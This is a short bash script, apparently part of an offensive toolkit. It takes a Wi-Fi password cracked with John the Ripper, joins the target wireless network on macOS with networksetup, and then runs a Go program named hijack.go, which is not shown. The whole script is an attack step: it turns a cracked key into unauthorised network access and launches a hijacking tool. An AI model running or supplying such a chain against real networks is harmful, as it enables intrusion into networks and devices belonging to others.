#!/bin/bash
psk=$(john $2 --show | head -1 | cut -d : -f 2)

networksetup -setairportnetwork en0 $1 $psk

sleep 3

echo Running code

go run hijack.go